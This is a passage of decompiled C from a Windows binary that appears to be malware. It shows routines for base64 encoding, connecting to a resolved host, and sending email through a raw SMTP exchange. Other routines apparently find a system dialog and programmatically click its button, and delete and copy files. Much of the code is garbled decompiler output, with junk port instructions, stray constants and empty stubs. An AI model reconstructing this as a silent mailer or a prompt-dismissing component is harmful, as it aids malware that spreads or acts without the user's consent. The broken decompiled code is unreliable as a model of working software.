        *(int32_t *)(v4 - 30) = 0;
        *(int32_t *)(v4 - 34) = 0;
        *(int32_t *)(v4 - 6) = a3;
        *(int32_t *)(v4 - 46) = v5;
        return 0;
    }
    int32_t v16 = &v11; // 0x40569b
    uint32_t v17 = result + 1; // 0x4056ed
    char * v18 = (char *)(v16 + 48 + 8 * v16); // 0x4056ee
    *v18 = *v18 + (char)(v17 / 256);
    __writefsdword(v17, v5);
    function_403370();
    int32_t v19 = function_4034c8(); // 0x4056ff
    int32_t * v20 = (int32_t *)((int32_t)v8 - 8); // 0x405704
    *v20 = v19;
    int64_t v21 = 0x100000000 * (int64_t)(v19 >> 31) | (int64_t)v19; // 0x405710
    int32_t result2 = v21 / 3; // 0x405710
    result = result2;
    if ((int32_t)(v21 % 3) != 0) {
        // 0x405723
        return result2;
    }
    uint32_t v22 = *v20; // 0x405716
    // 0x405730
    return (int32_t)((0x100000000 * (int64_t)(v22 / 0x80000000) | (int64_t)v22) / 3) - 1;
}

// Address range: 0x40573c - 0x4058f8
// Used cryptographic patterns:
//  - B64EncodeTable (8-bit, little endian)
int32_t function_40573c(void) {
    // 0x40573c
    int32_t v1; // 0x40573c
    char * v2 = (char *)(v1 - 9);
    char * v3 = (char *)(v1 - 10);
    char * v4 = (char *)(v1 - 11);
    char * v5 = (char *)(v1 - 12);
    int32_t * v6 = (int32_t *)(v1 - 16);
    int32_t v7 = 0; // 0x40573c
    int32_t v8 = 3 * v7; // 0x40573e
    int32_t v9 = *(int32_t *)(v1 - 8); // 0x405746
    int32_t v10; // 0x40573c
    int32_t v11; // 0x40573c
    char * v12; // 0x40573c
    unsigned char v13; // 0x40573c
    char v14; // 0x40573c
    unsigned char v15; // 0x40573c
    int32_t v16; // 0x405752
    char * v17; // 0x405752
    unsigned char v18; // 0x405752
    char v19; // 0x405760
    char v20; // 0x40576a
    char * v21; // 0x405776
    unsigned char v22; // 0x405776
    char v23; // 0x40578b
    char v24; // 0x405797
    unsigned char v25; // 0x4057a6
    char v26; // 0x4057be
    char v27; // 0x4057d3
    char v28; // 0x40587b
    unsigned char v29; // 0x405811
    char v30; // 0x405829
    char v31; // 0x405841
    if (v8 + 3 > v9) {
        // 0x4057de
        v11 = v8 + v10;
        v12 = (char *)v11;
        v13 = *v12;
        v14 = *(char *)((int32_t)(v13 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v2 = v14;
        v15 = *v12;
        if (v8 + 2 > v9) {
            // 0x40584d
            v28 = *(char *)((16 * (int32_t)v15 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v3 = v28;
            *v4 = 61;
            *v5 = 61;
        } else {
            // 0x4057e8
            v29 = *(char *)(v11 + 1);
            v30 = *(char *)((int32_t)(v29 / 16 | 16 * v15 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v3 = v30;
            v31 = *(char *)((4 * (int32_t)v29 & 60) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v4 = v31;
            *v5 = 61;
        }
    } else {
        // 0x40574f
        v16 = v8 + v10;
        v17 = (char *)v16;
        v18 = *v17;
        v19 = *(char *)((int32_t)(v18 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v2 = v19;
        v20 = *v17;
        v21 = (char *)(v16 + 1);
        v22 = *v21;
        v23 = *(char *)((int32_t)(v22 / 16 | 16 * v20 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v3 = v23;
        v24 = *v21;
        v25 = *(char *)(v16 + 2);
        v26 = *(char *)((int32_t)(v25 / 64 | 4 * v24 & 60) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v4 = v26;
        v27 = *(char *)((int32_t)(v25 & 63) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v5 = v27;
    }
    // 0x405889
    int32_t v32; // 0x40573c
    *(int32_t *)(v32 - 4) = *(int32_t *)*(int32_t *)(v1 - 4);
    function_403464();
    *(int32_t *)(v32 - 8) = *(int32_t *)(v1 - 20);
    function_403464();
    int32_t * v33 = (int32_t *)(v32 - 12);
    *v33 = *(int32_t *)(v1 - 24);
    function_403464();
    *(int32_t *)(v32 - 16) = *(int32_t *)(v1 - 28);
    function_403464();
    int32_t v34 = v32 - 20; // 0x4058c3
    int32_t * v35 = (int32_t *)v34;
    *v35 = *(int32_t *)(v1 - 32);
    function_403588((int32_t)&g111);
    int32_t v36 = *v6 - 1; // 0x4058d4
    *v6 = v36;
    v7++;
    while (v36 != 0) {
        // 0x40573e
        v8 = 3 * v7;
        v9 = *(int32_t *)(v1 - 8);
        if (v8 + 3 > v9) {
            // 0x4057de
            v11 = v8 + v10;
            v12 = (char *)v11;
            v13 = *v12;
            v14 = *(char *)((int32_t)(v13 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v2 = v14;
            v15 = *v12;
            if (v8 + 2 > v9) {
                // 0x40584d
                v28 = *(char *)((16 * (int32_t)v15 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
                *v3 = v28;
                *v4 = 61;
                *v5 = 61;
            } else {
                // 0x4057e8
                v29 = *(char *)(v11 + 1);
                v30 = *(char *)((int32_t)(v29 / 16 | 16 * v15 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
                *v3 = v30;
                v31 = *(char *)((4 * (int32_t)v29 & 60) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
                *v4 = v31;
                *v5 = 61;
            }
        } else {
            // 0x40574f
            v16 = v8 + v10;
            v17 = (char *)v16;
            v18 = *v17;
            v19 = *(char *)((int32_t)(v18 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v2 = v19;
            v20 = *v17;
            v21 = (char *)(v16 + 1);
            v22 = *v21;
            v23 = *(char *)((int32_t)(v22 / 16 | 16 * v20 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v3 = v23;
            v24 = *v21;
            v25 = *(char *)(v16 + 2);
            v26 = *(char *)((int32_t)(v25 / 64 | 4 * v24 & 60) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v4 = v26;
            v27 = *(char *)((int32_t)(v25 & 63) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v5 = v27;
        }
        // 0x405889
        *(int32_t *)(v34 - 4) = *(int32_t *)*(int32_t *)(v1 - 4);
        function_403464();
        *(int32_t *)(v34 - 8) = *(int32_t *)(v1 - 20);
        function_403464();
        v33 = (int32_t *)(v34 - 12);
        *v33 = *(int32_t *)(v1 - 24);
        function_403464();
        *(int32_t *)(v34 - 16) = *(int32_t *)(v1 - 28);
        function_403464();
        v34 -= 20;
        v35 = (int32_t *)v34;
        *v35 = *(int32_t *)(v1 - 32);
        function_403588((int32_t)&g111);
        v36 = *v6 - 1;
        *v6 = v36;
        v7++;
    }
    // 0x4058dd
    __writefsdword(0, *v35);
    *v33 = 0x4058ff;
    return function_403394();
}

// Address range: 0x4058f8 - 0x4058fd
int32_t function_4058f8(void) {
    // 0x4058f8
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4058fd - 0x4058ff
int32_t function_4058fd(void) {
    // 0x4058fd
    int32_t result; // 0x4058fd
    return result;
}

// Address range: 0x4058ff - 0x405905
int32_t function_4058ff(int32_t a1, int32_t a2) {
    // 0x4058ff
    int32_t result; // 0x4058ff
    return result;
}

// Address range: 0x405908 - 0x405961
int32_t function_405908(void) {
    struct hostent * v1 = gethostbyname((char *)function_4036c8()); // 0x405916
    function_402720();
    int32_t result; // 0x405908
    if (v1 != NULL) {
        int32_t v2 = *(int32_t *)*(int32_t *)((int32_t)v1 + 12); // 0x405936
        result = (int32_t)*(char *)v2;
    }
    // 0x405953
    return result;
}

// Address range: 0x405964 - 0x405a08
int32_t function_405964(void) {
    // 0x405964
    function_4036b8();
    int32_t v1 = __readfsdword(0); // bp-452, 0x405988
    __writefsdword(0, (int32_t)&v1);
    int32_t v2; // bp-412, 0x405964
    WSAStartup((int16_t)(int32_t)&v2, (struct WSAData *)257);
    int32_t v3 = 2; // bp-472, 0x4059a5
    int32_t sock_fd = socket(AF_UNSPEC, SOCK_STREAM, IPPROTO_IGMP); // 0x4059a7
    int32_t v4 = &v3; // 0x4059b1
    if (sock_fd != -1) {
        int16_t sock = htons((int16_t)function_405908()); // 0x4059cb
        int32_t v5 = sock_fd; // bp-488, 0x4059e0
        int32_t v6 = &v5; // 0x4059e0
        int32_t v7 = connect((int32_t)sock, (struct sockaddr *)&g111, (int32_t)&g111); // 0x4059e1
        v4 = v6;
        if (v7 == 0) {
            // 0x4059ea
            int32_t v8; // 0x405964
            *(int32_t *)v8 = sock_fd;
            v4 = v6;
        }
    }
    // 0x4059f2
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x405a0f;
    return function_403370();
}

// Address range: 0x405a08 - 0x405a0d
int32_t function_405a08(void) {
    // 0x405a08
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x405a0d - 0x405a0f
int32_t function_405a0d(void) {
    // 0x405a0d
    int32_t result; // 0x405a0d
    return result;
}

// Address range: 0x405a0f - 0x405a18
int32_t function_405a0f(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405a0f
    int32_t result; // 0x405a0f
    return result;
}

// Address range: 0x405a18 - 0x405a24
int32_t function_405a18(void) {
    // 0x405a18
    int32_t v1; // 0x405a18
    closesocket(v1);
    return WSACleanup();
}

// Address range: 0x405a24 - 0x405a95
int32_t function_405a24(void) {
    // 0x405a24
    function_4036b8();
    int32_t v1 = __readfsdword(0); // bp-4124, 0x405a47
    __writefsdword(0, (int32_t)&v1);
    function_4036c8();
    function_4076b8();
    int32_t sock = function_40768c(4); // 0x405a6a
    int32_t buf; // bp-4105, 0x405a24
    int32_t length; // 0x405a24
    send(sock, (char *)&buf, length, (int32_t)&g111);
    __writefsdword(0, length);
    return function_403370();
}

// Address range: 0x405a95 - 0x405a9a
int32_t function_405a95(void) {
    // 0x405a95
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x405a9a - 0x405a9c
int32_t function_405a9a(void) {
    // 0x405a9a
    int32_t result; // 0x405a9a
    return result;
}

// Address range: 0x405a9c - 0x405aa3
int32_t function_405a9c(int32_t a1) {
    // 0x405a9c
    int32_t result; // 0x405a9c
    return result;
}

// Address range: 0x405aa4 - 0x405ad0
int32_t function_405aa4(void) {
    // 0x405aa4
    int32_t sock; // 0x405aa4
    recv(sock, (char *)&g111, (int32_t)&g111, (int32_t)&g111);
    return function_4076a4();
}

// Address range: 0x405ad0 - 0x405d45
int32_t function_405ad0(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1; // bp-8, 0x405ad0
    int32_t v2 = &v1; // 0x405ad4
    int32_t v3; // 0x405ad0
    for (int32_t i = 8; i > 0; i--) {
        // 0x405ad9
        v3 = v2;
        *(int32_t *)(v3 - 4) = 0;
        v2 = v3 - 8;
        *(int32_t *)v2 = 0;
    }
    // 0x405ae0
    *(int32_t *)(v3 - 12) = 0;
    function_4036b8();
    function_4036b8();
    function_4036b8();
    function_4036b8();
    function_4036b8();
    function_4036b8();
    function_4036b8();
    int32_t v4; // bp-4, 0x405ad0
    *(int32_t *)(v3 - 20) = (int32_t)&v4;
    *(int32_t *)(v3 - 24) = 0x405d45;
    int32_t v5 = __readfsdword(0); // 0x405b2e
    int32_t v6 = v3 - 28; // 0x405b2e
    int32_t * v7 = (int32_t *)v6;
    *v7 = v5;
    __writefsdword(0, v6);
    int32_t * v8 = v7; // 0x405b48
    int32_t v9 = v6; // 0x405b48
    if (function_405964() != 0) {
        // 0x405b4e
        *(int32_t *)(v3 - 32) = (int32_t)"HELO ";
        *(int32_t *)(v3 - 40) = (int32_t)"\r\n";
        function_403588((int32_t)&g111);
        function_405a24();
        function_405aa4();
        function_405a24();
        function_405aa4();
        function_4034d0();
        function_405a24();
        function_405aa4();
        function_4034d0();
        function_405a24();
        function_405aa4();
        *(int32_t *)(v3 - 44) = (int32_t)"MAIL FROM: <";
        *(int32_t *)(v3 - 48) = a1;
        *(int32_t *)(v3 - 52) = (int32_t)&g2;
        *(int32_t *)(v3 - 56) = (int32_t)"\r\n";
        function_403588((int32_t)&g111);
        function_405a24();
        function_405aa4();
        *(int32_t *)(v3 - 60) = (int32_t)"RCPT TO: <";
        *(int32_t *)(v3 - 64) = a2;
        *(int32_t *)(v3 - 68) = (int32_t)&g2;
        *(int32_t *)(v3 - 72) = (int32_t)"\r\n";
        function_403588((int32_t)&g111);
        function_405a24();
        function_405aa4();
        function_405a24();
        function_405aa4();
        *(int32_t *)(v3 - 76) = (int32_t)"From: <";
        *(int32_t *)(v3 - 80) = a1;
        *(int32_t *)(v3 - 84) = (int32_t)&g2;
        *(int32_t *)(v3 - 88) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 92) = (int32_t)"To: <";
        *(int32_t *)(v3 - 96) = a2;
        *(int32_t *)(v3 - 100) = (int32_t)&g2;
        *(int32_t *)(v3 - 104) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 108) = (int32_t)"Subject: ";
        *(int32_t *)(v3 - 112) = a3;
        *(int32_t *)(v3 - 116) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 120) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 124) = a4;
        *(int32_t *)(v3 - 128) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 132) = (int32_t)&g3;
        v9 = v3 - 136;
        v8 = (int32_t *)v9;
        *v8 = (int32_t)"\r\n";
        function_403588((int32_t)&g111);
        function_405a24();
        function_405aa4();
        function_405a24();
        function_405aa4();
        function_405a18();
    }
    // 0x405d10
    __writefsdword(0, *v8);
    *(int32_t *)(v9 + 8) = 0x405d4c;
    function_403394();
    function_403394();
    return function_403394();
}

// Address range: 0x405d45 - 0x405d4a
int32_t function_405d45(void) {
    // 0x405d45
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x405d4a - 0x405d4c
int32_t function_405d4a(void) {
    // 0x405d4a
    int32_t result; // 0x405d4a
    return result;
}

// Address range: 0x405d4c - 0x405d55
int32_t function_405d4c(int32_t a1) {
    // 0x405d4c
    int32_t result; // 0x405d4c
    return result;
}

// Address range: 0x405e17 - 0x405e35
int32_t function_405e17(void) {
    // 0x405e17
    int32_t v1; // 0x405e17
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x405e17
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    int32_t v4; // 0x405e17
    char * v5 = (char *)(v4 + 85); // 0x405e1b
    int32_t v6; // 0x405e17
    *v5 = *v5 + (char)v6;
    return function_4033c4();
}

// Address range: 0x405e24 - 0x405e25
int32_t function_405e24(void) {
    // 0x405e24
    int32_t result; // 0x405e24
    return result;
}

// Address range: 0x405e3b - 0x405f23
int32_t function_405e3b(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405e3b
    int32_t v1; // 0x405e3b
    unsigned char v2 = (char)v1;
    unsigned char v3 = 2 * v2; // 0x405e3e
    *(char *)v1 = v3;
    if (v3 >= v2) {
        if (v1 == -(int32_t)&g101) {
            // 0x405eb1
            function_403370();
            function_403370();
        }
        // 0x405ec5
        __writefsdword(0, a3);
        return 0;
    }
    // 0x405e42
    uint32_t v4; // 0x405e3b
    int16_t v5 = v4; // 0x405e60
    int32_t v6; // 0x405e3b
    __asm_outsb(v5, *(char *)(100 * *(int32_t *)(v6 + 110)));
    int32_t v7; // 0x405e3b
    __readfsdword(v7 + 115);
    char v8 = __asm_insb(v5); // 0x405e66
    int32_t v9; // 0x405e3b
    char * v10 = (char *)v9; // 0x405e66
    *v10 = v8;
    int64_t v11 = (int64_t)*(int32_t *)(v6 + 104 & 0xffff); // 0x405e6b
    int64_t v12 = 103 * v11; // 0x405e6b
    int32_t v13 = v12; // 0x405e6b
    int32_t v14 = v13 - 4; // 0x405e70
    int32_t * v15 = (int32_t *)v14; // 0x405e70
    *v15 = 0x6b64736b;
    int32_t * v16 = (int32_t *)(v13 - 8); // 0x405e75
    *v16 = 97;
    *v10 = __asm_insb(v5);
    if (v12 == 0x6700000000 * v11 / 0x100000000) {
        unsigned char v17 = *(char *)&v6; // 0x405ee0
        unsigned char v18 = v17 + (char)(v4 / 256); // 0x405ee0
        *(char *)v6 = v18;
        int32_t v19; // 0x405e3b
        char * v20 = (char *)(v19 + 104); // 0x405ee2
        unsigned char v21 = *v20; // 0x405ee2
        *v20 = v21 / 64 | 8 * v21 | 4 * (char)(v18 < v17);
        int32_t v22 = *v16; // 0x405ee6
        uint32_t result = v1 + 1; // 0x405ee7
        char * v23 = (char *)(v22 + 48 + 8 * v22); // 0x405ee8
        *v23 = *v23 + (char)(result / 256);
        __writefsdword(result, v14);
        return result;
    }
    // 0x405e7a
    *(int32_t *)(v13 - 12) = 0x666a6766;
    int32_t * v24 = (int32_t *)(v13 - 16); // 0x405e7f
    *v24 = 107;
    *(int32_t *)(v13 - 20) = 97;
    *v10 = __asm_insb(v5);
    *(int32_t *)(v13 - 24) = 97;
    int32_t v25 = v13 + 4; // 0x405e90
    int32_t * v26 = (int32_t *)v25; // 0x405e90
    int32_t v27 = *v26; // 0x405e90
    *(char *)97 = __asm_insb((int16_t)*v15);
    char * v28 = (char *)v27; // 0x405e96
    *v28 = *v28 + (char)v27;
    *v26 = *v24;
    *(int32_t *)v13 = v25;
    *v15 = 0x405ed3;
    *v16 = __readfsdword(0);
    return 0;
}

// Address range: 0x405f23 - 0x405f28
int32_t function_405f23(void) {
    // 0x405f23
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x405f28 - 0x405f2a
int32_t function_405f28(void) {
    // 0x405f28
    int32_t result; // 0x405f28
    return result;
}

// Address range: 0x405f2a - 0x405f2d
int32_t function_405f2a(int32_t a1, int32_t a2) {
    // 0x405f2a
    int32_t result; // 0x405f2a
    return result;
}

// Address range: 0x405f30 - 0x406045
int32_t function_405f30(void) {
    // 0x405f30
    int32_t v1; // 0x405f30
    if (v1 == 0) {
        // 0x40603a
        int32_t v2; // bp-24, 0x405f30
        return *(int32_t *)((int32_t)&v2 + 4);
    }
    char * v3 = (char *)function_4036c8(); // 0x405f51
    char * lpszWindow = v3; // bp-28, 0x405f51
    if (!PathFileExistsA(v3)) {
        // 0x40603a
        return *(int32_t *)((int32_t)&lpszWindow + 4);
    }
    int32_t * hWnd = FindWindowExA(NULL, (int32_t *)"#32770", NULL, lpszWindow); // 0x405f73
    int32_t lParam = (int32_t)hWnd; // 0x405f73
    int32_t v4 = lParam; // bp-48, 0x405f7a
    if (!IsWindow(hWnd)) {
        // 0x40603a
        return *(int32_t *)((int32_t)&v4 + 4);
    }
    int32_t v5 = 66; // bp-56, 0x405f9c
    int32_t * hMem = GlobalAlloc(function_4034c8() + 22, 66); // 0x405f9e
    if (hMem == NULL) {
        // 0x40603a
        return *(int32_t *)((int32_t)&v5 + 4);
    }
    int32_t * v6 = GlobalLock(hMem); // 0x405fae
    char * v7; // bp-64, 0x405f30
    if (v6 == NULL) {
        // 0x405fb9
        v7 = (char *)hMem;
        GlobalFree(hMem);
        // 0x40603a
        return *(int32_t *)((int32_t)&v7 + 4);
    }
    int32_t v8 = (int32_t)v6; // 0x405fae
    *v6 = 20;
    *(int32_t *)(v8 + 4) = 0;
    *(int32_t *)(v8 + 8) = 0;
    *(int32_t *)(v8 + 12) = 0;
    *(int32_t *)(v8 + 16) = 0;
    char * lpString1 = (char *)function_4036c8(); // 0x405fe2
    v7 = lpString1;
    lstrcpyA(lpString1, (char *)(v8 + 20));
    GlobalUnlock(hMem);
    PostMessageA(NULL, (int32_t)hMem, 563, lParam);
    int32_t hWnd2 = function_4075ec(0x406050, 2000, -1); // 0x40601a
    int32_t v9 = hWnd2; // bp-104, 0x406021
    bool v10 = IsWindow((int32_t *)hWnd2); // 0x406022
    int32_t v11 = &v9; // 0x406029
    if (v10) {
        int32_t v12 = hWnd2; // bp-120, 0x406034
        SendMessageA(NULL, 0, 245, hWnd2);
        v11 = &v12;
    }
    // 0x40603a
    return *(int32_t *)(v11 + 4);
}

// Address range: 0x40605f - 0x40607d
int32_t function_40605f(void) {
    // 0x40605f
    int32_t v1; // 0x40605f
    char * v2 = (char *)(v1 - 0x4d42482c); // 0x40605f
    uint32_t v3; // 0x40605f
    *v2 = *v2 + (char)(v3 / 256);
    int32_t v4; // 0x40605f
    int32_t v5 = v4;
    *(char *)v5 = *(char *)&v4 + (char)v5;
    return function_4033c4();
}

// Address range: 0x406083 - 0x406157
int32_t function_406083(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406083
    int32_t v1; // 0x406083
    unsigned char v2 = (char)v1;
    unsigned char v3 = 2 * v2; // 0x406086
    *(char *)v1 = v3;
    if (v3 >= v2) {
        // 0x4060f0
        __writefsdword(0, a3);
        return 0;
    }
    // 0x40608a
    int32_t v4; // 0x406083
    int16_t v5 = v4; // 0x4060a8
    int32_t v6; // 0x406083
    __asm_outsb(v5, *(char *)(100 * *(int32_t *)(v6 + 110)));
    int32_t v7; // 0x406083
    __readfsdword(v7 + 115);
    char v8 = __asm_insb(v5); // 0x4060ae
    int32_t v9; // 0x406083
    char * v10 = (char *)v9; // 0x4060ae
    *v10 = v8;
    int64_t v11 = (int64_t)*(int32_t *)(v6 + 104 & 0xffff); // 0x4060b3
    int64_t v12 = 103 * v11; // 0x4060b3
    int32_t v13 = v12; // 0x4060b3
    int32_t * v14 = (int32_t *)(v13 - 4); // 0x4060b8
    *v14 = 0x6b64736b;
    int32_t * v15 = (int32_t *)(v13 - 8); // 0x4060bd
    *v15 = 97;
    *v10 = __asm_insb(v5);
    if (v12 == 0x6700000000 * v11 / 0x100000000) {
        unsigned char v16 = *(char *)&v7; // 0x406128
        unsigned char v17 = v16 + v2; // 0x406128
        *(char *)v7 = v17;
        if (v17 < v16) {
            // 0x40612c
            int32_t v18; // 0x406083
            return v18 - 4;
        }
        // 0x406141
        __writefsdword(0, *v15);
        *(int32_t *)v13 = 0x40615e;
        return function_403370();
    }
    // 0x4060c2
    *(int32_t *)(v13 - 12) = 0x666a6766;
    int32_t * v19 = (int32_t *)(v13 - 16); // 0x4060c7
    *v19 = 107;
    *(int32_t *)(v13 - 20) = 97;
    *v10 = __asm_insb(v5);
    *(int32_t *)(v13 - 24) = 97;
    int32_t v20 = v13 + 4; // 0x4060d8
    int32_t * v21 = (int32_t *)v20; // 0x4060d8
    int32_t v22 = *v21; // 0x4060d8
    *(char *)97 = __asm_insb((int16_t)*v14);
    char * v23 = (char *)v22; // 0x4060de
    *v23 = *v23 + (char)v22;
    *v21 = *v19;
    *(int32_t *)v13 = v20;
    *v14 = 0x406105;
    *v15 = __readfsdword(0);
    return 0;
}

// Address range: 0x406157 - 0x40615c
int32_t function_406157(void) {
    // 0x406157
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x40615c - 0x40615e
int32_t function_40615c(void) {
    // 0x40615c
    int32_t result; // 0x40615c
    return result;
}

// Address range: 0x40615e - 0x406161
int32_t function_40615e(int32_t a1, int32_t a2) {
    // 0x40615e
    int32_t result; // 0x40615e
    return result;
}

// Address range: 0x406164 - 0x406200
int32_t function_406164(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    // 0x406164
    int32_t v1; // 0x406164
    unsigned char v2 = *(char *)(2 * v1) ^ (char)v1; // 0x40616b
    int32_t v3 = v1 & -256 | (int32_t)v2; // 0x40616b
    char * v4 = (char *)v3; // 0x40616e
    int32_t v5; // 0x406164
    char v6 = v5; // 0x406170
    *v4 = v2 + v6 + *v4;
    int32_t v7 = v3 + 1; // 0x406172
    char * v8 = (char *)v7; // 0x406173
    int32_t v9; // 0x406164
    char v10 = v9; // 0x406173
    *v8 = v10 + v6 + *v8 + (char)v7;
    char * v11 = (char *)(v3 + 2); // 0x40617b
    *v11 = *v11 + v10;
    *(int32_t *)0x11004061 = __asm_insd((int16_t)a4);
    int32_t result; // 0x406164
    if (function_403c90() < 0) {
        // 0x4061b8
        function_403c88();
        function_403e44();
        function_403c90();
        function_4033c4();
        result = -1;
    } else {
        // 0x4061f9
        function_403614();
        result = 0;
    }
    // 0x4061f9
    return result;
}

// Address range: 0x406200 - 0x406237
int32_t function_406200(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40620b
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g102 + 1; // 0x406211
    g102 = v2;
    if (v2 == 0) {
        // 0x406219
        function_403e50();
    }
    // 0x406229
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x406237 - 0x40623c
int32_t function_406237(void) {
    // 0x406237
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x40623c - 0x40623e
int32_t function_40623c(void) {
    // 0x40623c
    int32_t result; // 0x40623c
    return result;
}

// Address range: 0x40623e - 0x406240
int32_t function_40623e(int32_t a1) {
    // 0x40623e
    int32_t result; // 0x40623e
    return result;
}

// Address range: 0x406240 - 0x406282
int32_t function_406240(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40624b
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g102; // 0x406251
    g102 = v2 - 1;
    if (v2 == 0) {
        // 0x40625a
        function_403e44();
    }
    // 0x406274
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x406282 - 0x406287
int32_t function_406282(void) {
    // 0x406282
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x406287 - 0x406289
int32_t function_406287(void) {
    // 0x406287
    int32_t result; // 0x406287
    return result;
}

// Address range: 0x406289 - 0x40628b
int32_t function_406289(int32_t a1) {
    // 0x406289
    int32_t result; // 0x406289
    return result;
}

// Address range: 0x40628c - 0x4063cf
int32_t function_40628c(int32_t a1) {
    // 0x40628c
    int32_t v1; // 0x40628c
    __asm_into(v1);
    int32_t v2; // 0x40628c
    unsigned char v3 = (char)v2 & 31; // 0x40628d
    char v4; // 0x40628c
    int32_t v5; // 0x40628c
    if (v3 == 0) {
        // 0x40628c
        int32_t v6; // 0x40628c
        v4 = v6;
    } else {
        int32_t v7; // 0x40628c
        char * v8 = (char *)(v7 - 0x392a2a3c); // 0x40628d
        *v8 = *v8 << v3;
        v4 = *(char *)&v5;
    }
    int32_t v9; // 0x40628c
    char * v10 = (char *)(v9 & -256 | (int32_t)v4); // 0x406294
    *v10 = 30 * v4 + *v10;
    int32_t v11 = 0; // bp-16, 0x4062d7
    v5 = a1;
    int32_t v12 = __readfsdword(0); // bp-48, 0x4062e8
    __writefsdword(0, (int32_t)&v12);
    int32_t v13 = a1; // bp-56, 0x4062f7
    int32_t v14 = &v13; // 0x4062f7
    int32_t v15 = GetClassLongA((int32_t *)-1, (int32_t)&g111); // 0x4062f8
    int32_t v16 = v14; // 0x406302
    if (v15 == 0x8002) {
        // 0x406308
        function_4076e0();
        int32_t v17 = function_40380c(); // 0x40631a
        int32_t v18 = function_40380c() - 1; // 0x406333
        v16 = v14;
        if (v18 >= 0 && v17 + 2 <= v18) {
            int32_t v19 = &v11; // bp-60, 0x40633f
            function_403728(&v11);
            v16 = &v19;
            if (v11 != 0) {
                // 0x406364
                function_4074c8();
                function_403474();
                function_4034d0();
                DeleteFileA((char *)function_4036c8());
                char * lpExistingFileName = (char *)function_4036c8(); // 0x4063a4
                char * v20 = lpExistingFileName; // bp-76, 0x4063a4
                CopyFileA(lpExistingFileName, (char *)&g111, (bool)&g111);
                function_405f30();
                v16 = (int32_t)&v20;
            }
        }
    }
    // 0x4063b4
    __writefsdword(0, *(int32_t *)v16);
    *(int32_t *)(v16 + 8) = 0x4063d6;
    return function_403394();
}

// Address range: 0x4063cf - 0x4063d4
int32_t function_4063cf(void) {
    // 0x4063cf
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4063d4 - 0x4063d6
int32_t function_4063d4(void) {
    // 0x4063d4
    int32_t result; // 0x4063d4
    return result;
}

// Address range: 0x4063d6 - 0x4063e2
int32_t function_4063d6(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4063d6
    int32_t v1; // 0x4063d6
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x4063e7 - 0x4063f1
int32_t function_4063e7(void) {
    // 0x4063e7
    int32_t v1; // 0x4063e7
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x4063e7
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    return result;
}

// Address range: 0x4063f6 - 0x40640d
int32_t function_4063f6(void) {
    // 0x4063f6
    int32_t v1; // 0x4063f6
    *(char *)v1 = 2 * (char)v1;
    uint32_t v2; // 0x4063f6
